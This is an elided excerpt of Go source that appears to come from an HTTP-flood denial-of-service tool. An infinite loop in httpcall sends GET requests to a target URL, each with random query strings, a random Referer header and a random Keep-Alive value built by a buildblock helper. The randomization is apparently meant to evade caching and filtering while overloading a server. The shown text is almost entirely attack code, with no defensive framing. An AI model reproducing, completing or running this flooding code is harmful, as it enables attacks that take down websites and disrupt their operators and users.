...
func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
	...
	for {
		...
		if data == "" {
			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(130)+130)+"="+buildblock(rand.Intn(130)+130), nil)
		} else {
		...
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(130)+130))
		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(130)+130))
...
func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(40)+80))
	}
	return string(a)
}
